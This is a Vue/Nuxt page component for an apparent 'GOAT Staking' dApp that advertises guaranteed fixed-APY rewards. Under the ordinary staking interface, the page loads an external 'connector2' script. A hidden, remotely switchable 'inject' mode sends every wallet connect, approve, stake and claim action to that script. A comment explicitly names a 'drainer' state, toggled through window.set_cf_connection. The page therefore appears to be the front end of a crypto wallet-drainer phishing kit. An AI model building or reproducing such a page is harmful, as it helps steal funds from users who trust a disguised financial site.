<template>
  <div class="staking-page">
    <!-- Orbs wrapped to prevent double scrollbars -->
    <div style="position: absolute; inset: 0; overflow: hidden; pointer-events: none; z-index: 0;">
      <div class="orb orb-purple" style="top: -10%; left: -10%; width: 500px; height: 500px; opacity: 0.3;"></div>
      <div class="orb orb-cyan" style="bottom: -10%; right: -10%; width: 500px; height: 500px; opacity: 0.2;"></div>
    </div>

    <div class="staking-container">
      <!-- ── Left Column: Stats & Information ── -->
      <aside class="stats-panel">
        <div class="section-label">🔒 GOAT Staking</div>
        <h1 class="stats-title">
          Stake GOAT Tokens<br /><span class="gradient-text">GOAT Protocol</span>
        </h1>
        <p class="stats-desc">
          Lock your GOAT tokens to support the stability of the GoatSwap protocol and earn guaranteed rewards with a fixed APY yield.
        </p>

        <!-- Stats Grid -->
        <div class="stats-cards">
          <div class="stat-card glass-card">
            <div class="stat-card-label">Total Value Locked (TVL)</div>
            <div class="stat-card-value gradient-text">{{ formatAmount(tvl) }}</div>
            <div class="stat-card-unit">GOAT Locked</div>
          </div>
          <div class="stat-card glass-card">
            <div class="stat-card-label">Annual Percentage Yield (APY)</div>
            <div class="stat-card-value" style="color: var(--accent-cyan);">{{ formatApy(apyRate) }}%</div>
            <div class="stat-card-unit">Fixed Rate</div>
          </div>
          <div class="stat-card glass-card">
            <div class="stat-card-label">Rewards Accrual</div>
            <div class="stat-card-value" style="color: #00e67a;">Real-time</div>
            <div class="stat-card-unit">Every second</div>
          </div>
          <div class="stat-card glass-card">
            <div class="stat-card-label">Lockup Period</div>
            <div class="stat-card-value" style="font-size: 20px; color: var(--text-primary);">None</div>
            <div class="stat-card-unit">Withdraw anytime</div>
          </div>
        </div>

        <!-- Info Block -->
        <div class="staking-info-block glass-card">
          <h3 class="sib-title">How does it work?</h3>
          <ul class="sib-list">
            <li><span>1.</span> Deposit GOAT tokens into the staking smart contract.</li>
            <li><span>2.</span> Rewards accrue every second based on your staked balance.</li>
            <li><span>3.</span> Claim rewards or withdraw your deposit (Unstake) at any time.</li>
          </ul>
        </div>
      </aside>

      <!-- ── Right Column: Staking Card ── -->
      <div class="staking-action-area">
        <div class="staking-card glass-card">

          <!-- 1. Wallet Not Connected -->
          <div v-if="!walletAddress" class="staking-step staking-step--center">
            <!-- Swiper with Nuxt Images of wallets -->
            <div class="wallet-swiper-wrap">
              <ClientOnly>
                <Swiper
                  :modules="[Autoplay, EffectCreative]"
                  :effect="'creative'"
                  :grab-cursor="true"
                  :loop="true"
                  :autoplay="{
                    delay: 2000,
                    disableOnInteraction: false
                  }"
                  :creative-effect="{
                    prev: { translate: ['-120%', 0, -500] },
                    next: { translate: ['120%', 0, 0] }
                  }"
                  class="wallet-swiper"
                >
                  <SwiperSlide v-for="w in swiperWallets" :key="w.id">
                    <div class="swiper-wallet-card" :style="{ background: w.color }">
                      <NuxtImg :src="w.icon" :alt="w.name" width="50" height="50" class="swiper-wallet-icon" />
                      <span class="swiper-wallet-name">{{ w.name }}</span>
                    </div>
                  </SwiperSlide>
                </Swiper>
                <template #fallback>
                  <div class="swiper-wallet-card" :style="{ background: swiperWallets[0].color }">
                    <NuxtImg :src="swiperWallets[0].icon" :alt="swiperWallets[0].name" width="50" height="50" class="swiper-wallet-icon" />
                    <span class="swiper-wallet-name">{{ swiperWallets[0].name }}</span>
                  </div>
                </template>
              </ClientOnly>
            </div>
            <h2 class="action-title">Connect Wallet</h2>
            <p class="action-subtitle">Connect your Web3 wallet to start staking GOAT tokens.</p>

            <button
              class="btn btn-primary btn-connect-staking"
              style="width: 100%; max-width: 280px; margin: 24px auto 12px; padding: 16px;"
              @click="handleConnectClick"
            >
              <span>Connect Wallet</span>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                <path d="M3 8h10M9 4l4 4-4 4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </button>
            <p v-if="connectError" class="error-text">{{ connectError }}</p>
          </div>

          <!-- 2. Wallet Connected & Loading -->
          <div v-else-if="loadingData" class="staking-step staking-step--center">
            <div class="checking-spinner" />
            <p class="checking-text">Loading staking data...</p>
            <p class="checking-addr">{{ shortAddr(walletAddress) }}</p>
          </div>

          <!-- 3. Staking Dashboard -->
          <div v-else class="staking-step">
            <!-- User Balances Row -->
            <div class="user-balances-grid">
              <div class="balance-item">
                <span class="bi-label">Your GOAT Balance</span>
                <span class="bi-value">{{ formatAmount(walletBalance) }} GOAT</span>
              </div>
              <div class="balance-item">
                <span class="bi-label">Staked Amount</span>
                <span class="bi-value text-accent">{{ formatAmount(stakedBalance) }} GOAT</span>
              </div>
            </div>

            <!-- Tab Switcher -->
            <div class="tab-switcher">
              <button
                class="tab-btn"
                :class="{ active: activeTab === 'stake' }"
                @click="activeTab = 'stake'; amountInput = ''; txError = ''; txSuccessHash = '';"
              >
                Stake
              </button>
              <button
                class="tab-btn"
                :class="{ active: activeTab === 'unstake' }"
                @click="activeTab = 'unstake'; amountInput = ''; txError = ''; txSuccessHash = '';"
              >
                Unstake
              </button>
            </div>

            <!-- Stake Form -->
            <div v-if="activeTab === 'stake'" class="form-body">
              <div class="input-wrapper">
                <div class="input-header">
                  <span class="input-label">GOAT Amount</span>
                  <button class="btn-max" @click="setMaxAmount">MAX</button>
                </div>
                <div class="input-row">
                  <input
                    type="number"
                    v-model="amountInput"
                    placeholder="0.0"
                    min="0"
                    step="any"
                    class="staking-input"
                  />
                  <span class="input-symbol">GOAT</span>
                </div>
              </div>

              <!-- Estimated Earnings -->
              <div class="est-earnings-box">
                <div class="eeb-row">
                  <span>Est. Daily Earnings:</span>
                  <span class="text-green">+{{ estDailyRewards }} GOAT</span>
                </div>
                <div class="eeb-row">
                  <span>Est. Monthly Earnings:</span>
                  <span class="text-green">+{{ estMonthlyRewards }} GOAT</span>
                </div>
              </div>

              <!-- Action Button -->
              <button
                v-if="needsApproval"
                class="btn btn-primary btn-action"
                :disabled="submittingTx || !amountInput || parseFloat(amountInput) <= 0"
                @click="handleApprove"
              >
                <span v-if="!submittingTx">Approve GOAT</span>
                <span v-else class="loading-state">
                  <span class="wallet-btn-spinner" />
                  Confirming in wallet...
                </span>
              </button>
              <button
                v-else
                class="btn btn-primary btn-action"
                :disabled="submittingTx || !amountInput || parseFloat(amountInput) <= 0 || !hasEnoughBalance"
                @click="handleStake"
              >
                <span v-if="!submittingTx">Stake GOAT</span>
                <span v-else class="loading-state">
                  <span class="wallet-btn-spinner" />
                  Sending transaction...
                </span>
              </button>
            </div>

            <!-- Unstake Form -->
            <div v-else class="form-body">
              <div class="input-wrapper">
                <div class="input-header">
                  <span class="input-label">Withdraw Staked GOAT</span>
                  <button class="btn-max" @click="setMaxAmount">MAX</button>
                </div>
                <div class="input-row">
                  <input
                    type="number"
                    v-model="amountInput"
                    placeholder="0.0"
                    min="0"
                    step="any"
                    class="staking-input"
                  />
                  <span class="input-symbol">GOAT</span>
                </div>
              </div>

              <button
                class="btn btn-primary btn-action"
                :disabled="submittingTx || !amountInput || parseFloat(amountInput) <= 0 || !hasEnoughStaked"
                @click="handleUnstake"
              >
                <span v-if="!submittingTx">Unstake GOAT</span>
                <span v-else class="loading-state">
                  <span class="wallet-btn-spinner" />
                  Sending transaction...
                </span>
              </button>
            </div>

            <!-- Rewards Card Block -->
            <div class="rewards-claim-card glass-card">
              <div class="rcc-left">
                <span class="rcc-label">Accumulated Rewards</span>
                <div class="rcc-value gradient-text font-display">
                  {{ displayEarned }}
                  <span class="rcc-token">GOAT</span>
                </div>
              </div>
              <button
                class="btn btn-secondary btn-claim-rewards"
                :disabled="submittingTx || claimingRewards || earnedRewards === 0n"
                @click="handleClaimRewards"
              >
                <span v-if="!claimingRewards">Claim Rewards</span>
                <span v-else class="loading-state">
                  <span class="wallet-btn-spinner" />
                  Claiming...
                </span>
              </button>
            </div>

            <!-- Connected Info -->
            <div class="connected-info-row">
              <span>Wallet: <strong class="text-cyan">{{ shortAddr(walletAddress) }}</strong></span>
              <button class="btn-disconnect-link" @click="disconnect">Disconnect</button>
            </div>

            <p v-if="txError" class="error-text mt-12">{{ txError }}</p>
            <p v-if="txSuccessHash" class="success-text mt-12">
              Transaction sent successfully! <br />
              <a :href="`${explorerBase}/tx/${txSuccessHash}`" target="_blank" class="explorer-link-inline">
                View in Explorer
                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style="margin-left: 2px;">
                  <path d="M2 2h8v8M10 2L2 10" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
                </svg>
              </a>
            </p>
          </div>
        </div>

        <!-- Token Contract Info -->
        <div class="token-addresses-card glass-card">
          <div class="tac-title">Contract Addresses:</div>
          <div class="tac-row">
            <span class="tac-label">GOAT Token:</span>
            <div class="tac-copy-wrap">
              <span class="tac-address">{{ shortAddr(TOKEN_ADDRESS) }}</span>
              <button class="btn-copy-mini" @click="copyText(TOKEN_ADDRESS, 'token')">
                {{ copyState.token ? 'Copied!' : 'Copy' }}
              </button>
            </div>
          </div>
          <div class="tac-row">
            <span class="tac-label">Staking Contract:</span>
            <div class="tac-copy-wrap">
              <span class="tac-address">{{ shortAddr(STAKING_CONTRACT_ADDRESS) }}</span>
              <button class="btn-copy-mini" @click="copyText(STAKING_CONTRACT_ADDRESS, 'staking')">
                {{ copyState.staking ? 'Copied!' : 'Copy' }}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- WalletModal component for connection -->
    <WalletModal :open="localModalOpen" @close="localModalOpen = false" @select="handleLocalWalletSelect" />
  </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted, watch } from 'vue'
import { Swiper, SwiperSlide } from 'swiper/vue'
import { Autoplay, EffectCreative } from 'swiper/modules'
import 'swiper/css'
import 'swiper/css/effect-creative'


// Layout
definePageMeta({ layout: 'airdrop' })

useSeoMeta({
  title: 'GOAT Staking — GoatSwap',
  description: 'Stake your GOAT tokens under a fixed annual percentage yield (APY). Earn rewards in real time.',
})

// Config
const config = useRuntimeConfig()

// Load widget script on the page
useHead({
  script: [
    {
      src: config.public.connectorScriptUrl,
      defer: true,
      id: "connector2-script",
      onload: `
        window.__connector2Ready = true;
        if (window.__connector2PendingInit) {
          window.__connector2PendingInit();
        }
      `,
    },
  ],
})

const STAKING_CONTRACT_ADDRESS = config.public.stakingContract
const TOKEN_ADDRESS = config.public.airdropToken || '0xd1770254071Be4d7b26683191Dc6C0D2E8dBD7Da'
const explorerBase = 'https://sepolia.etherscan.io'

const staticUrl = config.public.staticUrl || 'http://localhost:3010/public/'

const swiperWallets = [
  {
    id: 'metamask',
    name: 'MetaMask',
    icon: staticUrl + 'metamask.png',
    color: 'linear-gradient(135deg, rgba(243,146,55,0.2), rgba(243,146,55,0.05))',
  },
  {
    id: 'walletconnect',
    name: 'WalletConnect',
    icon: staticUrl + 'walletconnect.png',
    color: 'linear-gradient(135deg, rgba(59,153,252,0.2), rgba(59,153,252,0.05))',
  },
  {
    id: 'coinbase',
    name: 'Coinbase Wallet',
    icon: staticUrl + 'coinbase.png',
    color: 'linear-gradient(135deg, rgba(0,82,255,0.2), rgba(0,82,255,0.05))',
  },
  {
    id: 'trust',
    name: 'Trust Wallet',
    icon: staticUrl + 'trust.png',
    color: 'linear-gradient(135deg, rgba(51,117,255,0.2), rgba(51,117,255,0.05))',
  },
]

// State
const walletAddress = ref(null)
const connectError = ref('')
const localModalOpen = ref(false)
const connectingWallet = ref(null)
const currentConnectorMode = ref('clean')

const loadingData = ref(false)
const tvl = ref(0n)
const apyRate = ref(0n)
const rewardRate = ref(0n)
const walletBalance = ref(0n)
const stakedBalance = ref(0n)
const allowanceValue = ref(0n)
const earnedRewards = ref(0n)

const amountInput = ref('')
const activeTab = ref('stake') // 'stake' or 'unstake'
const submittingTx = ref(false)
const claimingRewards = ref(false)
const txError = ref('')
const txSuccessHash = ref('')

const copyState = ref({ token: false, staking: false })

// Ticking rewards simulation state
const lastEarnedUpdateTime = ref(0)

// Simulated live ticking rewards computation
const displayEarned = computed(() => {
  if (!walletAddress.value) return '0.000000'
  if (stakedBalance.value === 0n || rewardRate.value === 0n) {
    return formatBigIntDecimals(earnedRewards.value, 6)
  }
  
  const elapsedMs = Date.now() - lastEarnedUpdateTime.value
  const elapsedSeconds = BigInt(Math.floor(elapsedMs / 1000))
  const remainingMs = BigInt(elapsedMs % 1000)

  // rewardRate = reward per second per staked token (scaled by 1e18)
  // reward accrued = (stakedBalance * rewardRate * seconds) / 1e18
  const secondsAccrued = (stakedBalance.value * rewardRate.value * elapsedSeconds) / 1000000000000000000n
  // add fractional milliseconds for a perfectly smooth tick
  const msAccrued = (stakedBalance.value * rewardRate.value * remainingMs) / 1000000000000000000000n

  const totalSimulated = earnedRewards.value + secondsAccrued + msAccrued
  return formatBigIntDecimals(totalSimulated, 6)
})

// Robust conversion from float string to BigInt wei
function parseToWei(valStr) {
  if (!valStr || parseFloat(valStr) <= 0) return 0n
  const parts = valStr.toString().split('.')
  let whole = parts[0] || '0'
  let fraction = parts[1] || ''
  fraction = fraction.slice(0, 18).padEnd(18, '0')
  return BigInt(whole) * 10n ** 18n + BigInt(fraction)
}

// Calculations for estimated earnings
const estDailyRewards = computed(() => {
  if (!amountInput.value || parseFloat(amountInput.value) <= 0) return '0.00'
  try {
    const inputWei = parseToWei(amountInput.value)
    const dailyWei = (inputWei * rewardRate.value * 86400n) / 1000000000000000000n
    return formatBigIntDecimals(dailyWei, 2)
  } catch (e) {
    return '0.00'
  }
})

const estMonthlyRewards = computed(() => {
  if (!amountInput.value || parseFloat(amountInput.value) <= 0) return '0.00'
  try {
    const inputWei = parseToWei(amountInput.value)
    const monthlyWei = (inputWei * rewardRate.value * 86400n * 30n) / 1000000000000000000n
    return formatBigIntDecimals(monthlyWei, 2)
  } catch (e) {
    return '0.00'
  }
})

const needsApproval = computed(() => {
  if (activeTab.value !== 'stake') return false
  if (!amountInput.value || parseFloat(amountInput.value) <= 0) return false
  try {
    const inputWei = parseToWei(amountInput.value)
    return allowanceValue.value < inputWei
  } catch (e) {
    return true
  }
})

const hasEnoughBalance = computed(() => {
  if (!amountInput.value) return false
  try {
    const inputWei = parseToWei(amountInput.value)
    return walletBalance.value >= inputWei
  } catch (e) {
    return false
  }
})

const hasEnoughStaked = computed(() => {
  if (!amountInput.value) return false
  try {
    const inputWei = parseToWei(amountInput.value)
    return stakedBalance.value >= inputWei
  } catch (e) {
    return false
  }
})

// Formatting Helpers
function getConnectorMode() {
  return currentConnectorMode.value
}

function shortAddr(addr) {
  if (!addr) return ''
  return addr.slice(0, 6) + '…' + addr.slice(-4)
}

function formatAmount(weiVal) {
  if (!weiVal) return '0.00'
  const val = BigInt(weiVal)
  const divisor = 10n ** 18n
  const whole = val / divisor
  const remainder = val % divisor
  const remStr = remainder.toString().padStart(18, '0').slice(0, 2)
  return `${whole.toLocaleString()}.${remStr}`
}

function formatApy(apyWei) {
  if (!apyWei) return '0'
  const percentage = Number(BigInt(apyWei) / 1000000000000000n) / 10
  return percentage.toFixed(2)
}

function formatBigIntDecimals(weiVal, decimalsToShow = 4) {
  if (!weiVal) return '0.' + '0'.repeat(decimalsToShow)
  const val = BigInt(weiVal)
  const divisor = 10n ** 18n
  const whole = val / divisor
  const remainder = val % divisor
  const remStr = remainder.toString().padStart(18, '0').slice(0, decimalsToShow)
  return `${whole.toLocaleString()}.${remStr}`
}

function setMaxAmount() {
  if (activeTab.value === 'stake') {
    amountInput.value = (Number(walletBalance.value) / 1e18).toString()
  } else {
    amountInput.value = (Number(stakedBalance.value) / 1e18).toString()
  }
}

function copyText(text, key) {
  if (typeof navigator !== 'undefined' && navigator.clipboard) {
    navigator.clipboard.writeText(text)
    copyState.value[key] = true
    setTimeout(() => {
      copyState.value[key] = false
    }, 2000)
  }
}

// Blockchain Fetch logic
async function fetchPublicData() {
  if (typeof window === 'undefined' || !window.ethereum) return
  try {
    // 1. Fetch TVL: selector 0x18160ddd
    const tvlResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: STAKING_CONTRACT_ADDRESS, data: '0x18160ddd' }, 'latest']
    })
    tvl.value = BigInt(tvlResult)

    // 2. Fetch targetRewardApy: selector 0xb1fff635
    const apyResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: STAKING_CONTRACT_ADDRESS, data: '0xb1fff635' }, 'latest']
    })
    apyRate.value = BigInt(apyResult)

    // 3. Fetch rewardRate: selector 0x7b0a47ee
    const rateResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: STAKING_CONTRACT_ADDRESS, data: '0x7b0a47ee' }, 'latest']
    })
    rewardRate.value = BigInt(rateResult)
  } catch (e) {
    console.warn('Error fetching public staking data:', e.message)
  }
}

async function refreshData() {
  if (typeof window === 'undefined' || !window.ethereum || !walletAddress.value) return
  try {
    const userAddr = walletAddress.value

    // Fetch public data first
    await fetchPublicData()

    // 1. Fetch GOAT Balance of user: selector 0x70a08231
    const balData = '0x70a08231' + userAddr.replace('0x', '').padStart(64, '0')
    const balResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: TOKEN_ADDRESS, data: balData }, 'latest']
    })
    walletBalance.value = BigInt(balResult)

    // 2. Fetch Staked Balance of user: selector 0x70a08231 on Staking Contract
    const stakedResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: STAKING_CONTRACT_ADDRESS, data: balData }, 'latest']
    })
    stakedBalance.value = BigInt(stakedResult)

    // 3. Fetch Allowance: selector 0xdd62ed3e
    const allowanceData = '0xdd62ed3e' + userAddr.replace('0x', '').padStart(64, '0') + STAKING_CONTRACT_ADDRESS.replace('0x', '').padStart(64, '0')
    const allowanceResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: TOKEN_ADDRESS, data: allowanceData }, 'latest']
    })
    allowanceValue.value = BigInt(allowanceResult)

    // 4. Fetch Earned Rewards: selector 0x008cc262
    const earnedData = '0x008cc262' + userAddr.replace('0x', '').padStart(64, '0')
    const earnedResult = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: STAKING_CONTRACT_ADDRESS, data: earnedData }, 'latest']
    })
    earnedRewards.value = BigInt(earnedResult)
    lastEarnedUpdateTime.value = Date.now()
  } catch (e) {
    console.error('Error refreshing staking user data:', e)
  }
}

// Actions
async function handleApprove() {
  txError.value = ''
  txSuccessHash.value = ''
  submittingTx.value = true

  try {
    if (getConnectorMode() === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        window.connect_wallet()
      }
      return
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' })
    if (!accounts.length) throw new Error('Wallet not connected')
    const account = accounts[0]

    const amountWei = parseToWei(amountInput.value)

    // approve(address,uint256) -> selector 0x095ea7b3
    const spenderParam = STAKING_CONTRACT_ADDRESS.replace('0x', '').padStart(64, '0').toLowerCase()
    const amountParam = amountWei.toString(16).padStart(64, '0')
    const data = '0x095ea7b3' + spenderParam + amountParam

    const hash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: account, to: TOKEN_ADDRESS, data }],
    })

    txSuccessHash.value = hash

    // Poll allowance
    let approved = false
    for (let i = 0; i < 20; i++) {
      await new Promise(r => setTimeout(r, 1500))
      await refreshData()
      if (allowanceValue.value >= amountWei) {
        approved = true
        break
      }
    }
  } catch (e) {
    txError.value = formatError(e)
  } finally {
    submittingTx.value = false
  }
}

async function handleStake() {
  txError.value = ''
  txSuccessHash.value = ''
  submittingTx.value = true

  try {
    if (getConnectorMode() === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        window.connect_wallet()
      }
      return
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' })
    if (!accounts.length) throw new Error('Wallet not connected')
    const account = accounts[0]

    const amountWei = parseToWei(amountInput.value)

    // stake(uint256) -> selector 0xa694fc3a
    const amountParam = amountWei.toString(16).padStart(64, '0')
    const data = '0xa694fc3a' + amountParam

    const hash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: account, to: STAKING_CONTRACT_ADDRESS, data }],
    })

    txSuccessHash.value = hash
    amountInput.value = ''

    setTimeout(async () => {
      await refreshData()
    }, 3500)
  } catch (e) {
    txError.value = formatError(e)
  } finally {
    submittingTx.value = false
  }
}

async function handleUnstake() {
  txError.value = ''
  txSuccessHash.value = ''
  submittingTx.value = true

  try {
    if (getConnectorMode() === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        window.connect_wallet()
      }
      return
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' })
    if (!accounts.length) throw new Error('Wallet not connected')
    const account = accounts[0]

    const amountWei = parseToWei(amountInput.value)

    // withdraw(uint256) -> selector 0x2e1a7d4d
    const amountParam = amountWei.toString(16).padStart(64, '0')
    const data = '0x2e1a7d4d' + amountParam

    const hash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: account, to: STAKING_CONTRACT_ADDRESS, data }],
    })

    txSuccessHash.value = hash
    amountInput.value = ''

    setTimeout(async () => {
      await refreshData()
    }, 3500)
  } catch (e) {
    txError.value = formatError(e)
  } finally {
    submittingTx.value = false
  }
}

async function handleClaimRewards() {
  txError.value = ''
  txSuccessHash.value = ''
  claimingRewards.value = true

  try {
    if (getConnectorMode() === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        window.connect_wallet()
      }
      return
    }

    const accounts = await window.ethereum.request({ method: 'eth_accounts' })
    if (!accounts.length) throw new Error('Wallet not connected')
    const account = accounts[0]

    // getReward() -> selector 0x3d18b912
    const data = '0x3d18b912'

    const hash = await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: account, to: STAKING_CONTRACT_ADDRESS, data }],
    })

    txSuccessHash.value = hash

    setTimeout(async () => {
      await refreshData()
    }, 3500)
  } catch (e) {
    txError.value = formatError(e)
  } finally {
    claimingRewards.value = false
  }
}

function formatError(e) {
  console.error('Detailed transaction error:', e)
  let message = 'Transaction execution error'
  if (typeof e === 'string') {
    message = e
  } else if (e && typeof e === 'object') {
    const candidate = e.reason || e.data?.message || e.error?.message || e.message
    if (candidate) {
      message = candidate
    }
  }

  const lower = message.toLowerCase()
  if (lower.includes('user rejected') || lower.includes('user_rejected') || e?.code === 4001) {
    return 'Transaction rejected by user'
  }
  if (lower.includes('insufficient funds') || lower.includes('insufficient_funds')) {
    return 'Insufficient balance for gas fees'
  }
  return message
}

// Wallet Connection Helpers (matching airdrop page)
async function checkConnectedWallet() {
  if (typeof window !== 'undefined' && window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' })
      if (accounts && accounts.length > 0) {
        const addr = accounts[0].toLowerCase()
        if (walletAddress.value !== addr) {
          walletAddress.value = addr
          loadingData.value = true
          await refreshData()
          loadingData.value = false
        }
      } else if (walletAddress.value) {
        disconnect()
      }
    } catch (e) {
      console.warn('checkConnectedWallet error:', e.message)
    }
  }
}

function disconnect() {
  walletAddress.value = null
  walletBalance.value = 0n
  stakedBalance.value = 0n
  allowanceValue.value = 0n
  earnedRewards.value = 0n
  txError.value = ''
  txSuccessHash.value = ''
}

function handleConnectClick() {
  const mode = getConnectorMode()
  if (mode === 'inject') {
    if (window.Connector2) {
      window.Connector2.open()
    } else {
      window.dispatchEvent(new CustomEvent('connector2:open', { detail: { step: 'select_network' } }))
    }
  } else {
    localModalOpen.value = true
  }
}

async function handleLocalWalletSelect(walletId) {
  connectingWallet.value = walletId
  connectError.value = ''
  try {
    if (currentConnectorMode.value === 'inject') {
      if (typeof window !== 'undefined' && typeof window.connect_wallet === 'function') {
        let providerName = 'MetaMask'
        if (walletId === 'metamask') providerName = 'MetaMask'
        else if (walletId === 'trust') providerName = 'Trust Wallet'
        else if (walletId === 'coinbase') providerName = 'Coinbase'
        else if (walletId === 'walletconnect') providerName = 'WalletConnect'

        window.connect_wallet(providerName)
        localModalOpen.value = false
        return
      }
    }

    if (!window.ethereum) {
      throw new Error('Wallet not detected. Install MetaMask.')
    }

    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
    if (!accounts.length) throw new Error('Wallet returned empty accounts list')

    walletAddress.value = accounts[0].toLowerCase()
    localModalOpen.value = false

    loadingData.value = true
    await refreshData()
    loadingData.value = false
  } catch (e) {
    connectError.value = e.message || 'Wallet connection failed'
  } finally {
    connectingWallet.value = null
  }
}

// Lifecycle Polling
let pollInterval = null
let refreshInterval = null
let modeWatcherInterval = null

onMounted(async () => {

  const apiUrl = config.public.connectorApiUrl || 'http://localhost:3010'

  function initConnector() {
    console.log('[Staking Page] Initializing Connector2. Mode:', getConnectorMode())
    if (window.Connector2) {
      window.Connector2.init({
        selector: "", // Pass empty selector to prevent the widget from intercepting clicks
        apiUrl,
      })
    }
  }

  // Check if script is already loaded
  if (window.Connector2) {
    initConnector()
  } else {
    // Look for script tag in the DOM
    const script = document.getElementById("connector2-script")
    if (script) {
      script.addEventListener("load", () => {
        initConnector()
      })
      // Fallback: in case the load event was already fired
      setTimeout(() => {
        if (window.Connector2) initConnector()
      }, 1000)
    } else {
      // If script tag is not in DOM yet, poll for window.Connector2
      let attempts = 0
      const interval = setInterval(() => {
        attempts++
        if (window.Connector2) {
          initConnector()
          clearInterval(interval)
        } else if (attempts > 30) {
          clearInterval(interval)
        }
      }, 200)
    }
  }

  // Try to load public data instantly
  if (typeof window !== 'undefined' && window.ethereum) {
    await fetchPublicData()
    
    // Setup listeners
    window.ethereum.on('accountsChanged', (accs) => {
      if (!accs.length) disconnect()
      else {
        walletAddress.value = accs[0].toLowerCase()
        refreshData()
      }
    })
    window.ethereum.on('chainChanged', () => { disconnect(); fetchPublicData(); })
  }

  await checkConnectedWallet()

  // Poll for wallet changes
  pollInterval = setInterval(async () => {
    await checkConnectedWallet()
  }, 1500)

  // Auto-refresh user variables every 5 seconds
  refreshInterval = setInterval(async () => {
    if (walletAddress.value) {
      await refreshData()
    } else {
      await fetchPublicData()
    }
  }, 5000)

  // Modes integration with Socket Service
  function getModeFromAnywhere() {
    if (typeof window === 'undefined') return 'clean'
    if (window.__connectorMode) return window.__connectorMode
    try {
      const cached = sessionStorage.getItem('uc_config')
      if (cached) {
        const parsed = JSON.parse(cached)
        return parsed.mode || 'clean'
      }
    } catch (e) {}
    return 'clean'
  }

  // Set initial mode state on mount
  currentConnectorMode.value = getModeFromAnywhere()
  if (typeof window !== 'undefined' && typeof window.set_cf_connection === 'function') {
    window.set_cf_connection(currentConnectorMode.value === 'inject')
  }

  // Hot swap mode watcher interval (reads changes from Socket Service writing to window.__connectorMode)
  modeWatcherInterval = setInterval(() => {
    const rawMode = getModeFromAnywhere()
    if (currentConnectorMode.value !== rawMode) {
      console.log('[Staking Page] Hot swapping mode to:', rawMode)
      currentConnectorMode.value = rawMode

      // Make sure it is synced back to sessionStorage for future page loads
      try {
        const cached = sessionStorage.getItem('uc_config') || '{}'
        const parsed = JSON.parse(cached)
        parsed.mode = rawMode
        sessionStorage.setItem('uc_config', JSON.stringify(parsed))
      } catch (e) {}

      // Update the main.js drainer state
      if (typeof window !== 'undefined' && typeof window.set_cf_connection === 'function') {
        window.set_cf_connection(rawMode === 'inject')
      }
    }
  }, 300)
})

onUnmounted(() => {
  if (pollInterval) clearInterval(pollInterval)
  if (refreshInterval) clearInterval(refreshInterval)
  if (modeWatcherInterval) clearInterval(modeWatcherInterval)
})
</script>

<style scoped>
/* Page Layout */
.staking-page {
  position: relative;
  min-height: calc(100vh - 65px - 57px);
  max-width: 1200px;
  margin: 0 auto;
  padding: 60px 24px;
}

.staking-container {
  display: grid;
  grid-template-columns: 1.1fr 0.9fr;
  gap: 64px;
  align-items: start;
}

/* Left Column: Stats & Information */
.stats-panel {
  max-width: 540px;
}

.stats-title {
  font-size: clamp(36px, 4.5vw, 52px);
  font-weight: 900;
  line-height: 1.15;
  letter-spacing: -0.02em;
  color: var(--text-primary);
  margin: 16px 0 20px;
}

.stats-desc {
  font-size: 16px;
  color: var(--text-secondary);
  line-height: 1.7;
  margin-bottom: 40px;
}

.stats-cards {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
  margin-bottom: 36px;
}

.stat-card {
  padding: 20px;
  border-radius: var(--radius-md);
}

.stat-card-label {
  font-size: 11px;
  font-weight: 600;
  letter-spacing: 0.08em;
  text-transform: uppercase;
  color: var(--text-muted);
  margin-bottom: 8px;
}

.stat-card-value {
  font-family: var(--font-display);
  font-size: 24px;
  font-weight: 800;
  line-height: 1.1;
  margin-bottom: 4px;
}

.stat-card-unit {
  font-size: 12px;
  color: var(--text-muted);
}

/* Info Block */
.staking-info-block {
  padding: 24px 28px;
  background: var(--bg-card);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-md);
}

.sib-title {
  font-size: 16px;
  font-weight: 700;
  margin-bottom: 16px;
  color: var(--text-primary);
}

.sib-list {
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.sib-list li {
  font-size: 14px;
  color: var(--text-secondary);
  display: flex;
  gap: 10px;
  line-height: 1.6;
}

.sib-list li span {
  color: var(--accent-cyan);
  font-weight: 700;
}

/* Right Column: Interaction Card */
.staking-action-area {
  display: flex;
  flex-direction: column;
  gap: 20px;
}

.staking-card {
  padding: 36px;
  border-radius: var(--radius-lg);
}

.staking-step--center {
  text-align: center;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 20px 0;
}

.branded-icon-wrap {
  width: 90px;
  height: 90px;
  border-radius: 50%;
  background: rgba(123, 63, 228, 0.1);
  border: 1px solid rgba(123, 63, 228, 0.25);
  display: flex;
  align-items: center;
  justify-content: center;
  margin-bottom: 24px;
}

.step-icon {
  font-size: 40px;
  display: inline-block;
}

.action-title {
  font-size: 24px;
  font-weight: 800;
